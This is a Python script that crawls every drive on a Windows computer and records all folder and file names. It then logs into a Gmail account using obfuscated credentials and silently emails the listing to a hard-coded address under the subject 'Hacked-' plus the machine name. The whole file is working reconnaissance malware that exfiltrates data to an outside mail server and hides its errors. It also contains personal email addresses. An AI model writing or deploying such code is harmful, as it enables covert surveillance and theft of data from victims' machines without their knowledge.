import os, smtplib
import encrept
from email.message import EmailMessage

prog_cwd = os.getcwd()

def doit(folder):
    temp = os.listdir(f'{folder}/')
    global final
    final += f'\n{os.getcwd()}\{folder} => {temp}\n'

    for i, file in enumerate(temp):
        if i == 0: # changing dir to perform isdir func. check clearly, cuz program is in one dir before...
            os.chdir(f'{folder}')
            # print(os.getcwd())

        if os.path.isfile(file):
            continue

        go_back = True
        for k in temp:
            if os.path.isdir(k):
                go_back = False

        if go_back:
            os.chdir('..')
            # print(os.getcwd())


        if os.path.isdir(file):
            doit(file)


# ------------------------------------------------------------------------------------------------------------------------------------------
# FOR SINGLE FOLDER

# os.chdir('k://')
# doit('Movies')
# a = input('Please Enter Something To End...')

# ------------------------------------------------------------------------------------------------------------------------------------------


# ------------------------------------------------------------------------------------------------------------------------------------------
# FOR WHOLE DRIVE
final = ''

alpha = 'abdefghijklmnopqrstuvwxyz'
not_touch = ['System Volume Information', '$RECYCLE.BIN']



for drive in alpha:
    
    try:
        
        if os.path.exists(f'{drive}://'):
            
            # drive = input('which drice you want to read(only give one letter like c/s/d/k): ')

            # os.chdir('k://')

            os.chdir(f'{drive}://')

            all = os.listdir(f'{drive}://')
            final += f'{os.getcwd()} => {all}\n\n\n\n'

            for i in all:
                final += '\n\n-----------------------------------------------------------------------------------------------------------------------------------\n\n'
                final += f'{i}'
                final += '\n\n-----------------------------------------------------------------------------------------------------------------------------------\n\n\n\n'

                if i in not_touch:
                    continue

                if os.path.isdir(i):
                    doit(f'{i}')

                os.chdir(f'{drive}://')
        
            final += '\n\n-----------------------------------------------------------------------------------------------------------------------------------\nDRIVE CHANGE(if any)\n-----------------------------------------------------------------------------------------------------------------------------------\n\n'

    except:
        print("Drive Not Found...")

# print(final)

# ------------------------------------------------------------------------------------------------------------------------------------------

os.chdir(prog_cwd)
# with open('data.txt', 'w') as t:
#     t.write(final)

try:

    server = smtplib.SMTP_SSL('smtp.gmail.com', 465) # using SMTP_SSL not SMTP to encrept our connection...

    msg = EmailMessage()
    msg['Subject'] = f"Hacked-{os.environ['COMPUTERNAME']}"
    msg['From'] = 'yourhomemanagement01@gmail.com'
    msg['To'] = 'krishnakumarkush@gmail.com'
    msg.set_content(f'{final}')
    server.login(encrept.decode('zn2vq`inXnd.nZloZhhdcnd"osc10g#f!nZbjkq>b1pl'), encrept.decode('sZ2it`m)Xin.ndl_lhbmcbf"flcfmgu'))
    server.send_message(msg)
    # print('mail send succesfully!!!')

except:
    # print('No Internet Connection')
    pass